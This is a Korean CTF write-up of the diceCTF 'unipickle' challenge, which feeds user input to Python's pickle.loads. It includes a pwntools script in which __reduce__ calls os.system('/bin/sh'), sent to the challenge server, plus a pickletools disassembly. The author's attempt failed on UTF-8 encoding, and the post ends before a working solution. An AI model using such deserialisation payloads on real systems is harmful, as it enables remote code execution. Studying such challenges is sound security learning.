---
title: diceCTF-unipickle writeup
date: 2024-02-07 00:10:10 +0900
categories: [writeup, misc]
tags: [diceCTF]
render_with_liquid: false
---

[diceCTF](https://ctf.dicega.ng/challs)에 참가는 했는데 문제는 풀지 못했다..

![1](/assets/img/posts/2024-02-07-itsme.png)

Unipickle이라는 문제에 꽂혀서 하나라도 풀어 보자는 생각이었지만 결국 실패했다. 대회가 끝난 뒤 디스코드에서 긁어 모은 라이트업을 내 나름대로 정리해보고자 한다.

## unipickle.py

```python
#!/usr/local/bin/python
import pickle
pickle.loads(input("pickle: ").split()[0].encode())
```

문제에 첨부된 unipickle.py의 내용은 정말 간단하다.
우선 python의 pickle 모듈을 사용한다. 사용자의 입력 값을 문자열로써 받아 UTF-8로 인코딩해 바이트 값으로 만들고, 이걸 pickle.loads로 역직렬화시킨다.

## 풀이

pickle에는 보안 취약성이 존재하는데, __reduce__ 메소드를 직렬화시킬 코드에 사용한다면 스택에서 호출 가능한 객체를 가져와서 별다른 <b>검증 없이 실행</b>하게 된다.

이에 착안하여 내가 구상한 공격 코드는 다음과 같다.

```python
import pickle
import pwn

class vul(object):
    import os
    
    def __reduce__(self):
        return (self.os.system, ("/bin/sh",))

temp = pickle.dumps(vul())
temp = temp.decode

r = remote('mc.ax', 31773)
r.sendline(temp)
r.interactive()
```

자세히 살펴보면, reduce 메소드가 반환할 튜플에 self.os.system를 그 매개변수로 /bin/sh 를 담았다.
해당 메소드가 담긴 객체를 pickle.dumps로 직렬화했고, 직렬화된 바이트 값을 decode로 UTF-8 인코딩해 서버의 input 함수에 전달하고자 했다.

잘 실행될 줄 알았으나...  

![2](/assets/img/posts/2024-02-07-error.png)

decode 부분에서 막혔다. 이유는 UTF-8로 인코딩이 불가능한 바이트 값을 포함하고 있었기 때문.  
서버는 입력단의 split 때문에 문자열만 처리하고 있기 때문에 이를 우회하기 위해선 UTF-8로 정상적인 디코딩이 가능한 직렬화된 바이트 값을 만들어야 한다.

필자는 이 이상 나아가지 못했지만, 이후는 디스코드에서 찾은 풀이들을 정리한 내용을 기술하겠다.

### 인코딩 가능한 바이트 시퀀스 만들기

직렬화된 바이트 값의 구조를 보기 위해 'pickletools' 모듈을 사용할 수 있다. 내가 만든 코드의 바이트 값을 상세하게 확인하기 위해 아래의 코드를 실행시켰다.

```python
from pickle import *
from pwn import *
import pickletools

class vul(object):
    import os
    
    def __reduce__(self):
        return (self.os.system, ("/bin/sh",))

p = pickle.dumps(vul())
pickletools.dis(p)
print(p)
```

![3](/assets/img/posts/2024-02-07-howcan.png)

먼저 주의해야 할 점은 이 구조는 운영체제마다 조금씩 다르다는 것이다. 특히 윈도우에선 os.system을 nt.system으로 받고 리눅스에선 posix.system으로 받는다.

바이트 시퀀스에서 proto(\x80), frame(\x95), memoize(\x94)같은 명령어들은 utf-8로 인코딩이 불가능하다.

일반적인 접근 방식처럼 원격 실행할 함수를 pickle 모듈로 직렬화시킨다면 이번 문제에선 사용할 수 없을 것이다.

